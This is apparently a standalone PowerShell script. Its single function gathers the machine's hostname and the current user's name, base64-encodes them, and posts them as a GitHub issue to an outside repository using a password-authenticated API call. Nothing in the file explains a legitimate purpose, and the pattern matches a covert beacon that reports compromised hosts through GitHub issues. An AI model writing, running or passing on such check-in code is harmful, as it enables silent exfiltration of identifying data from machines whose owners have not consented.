function projectzerod {
    [CmdletBinding()]
    Param(

        [parameter(Mandatory=$true)]
        [String[]]
        $Password
    )
    $hostName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $encodedhostName = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($hostName))
    $encodeduserName = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($userName))

    $userId = "ProjectZeroB"
    $authInfo = "$($userId):$($Password)" 
    $authInfo = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($authInfo))
    
    $headers = @{
        "Authorization" = "Basic " + $authInfo
        "Content-Type"  = "application/json"
        }

    $Body = @{
        title = $encodedhostName;
        body = $encodeduserName;
        } | ConvertTo-Json

    [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls" 
    Invoke-RestMethod -Headers $Headers -Uri https://api.github.com/repos/ProjectZeroB/Null/issues -Body $Body -Method Post
}
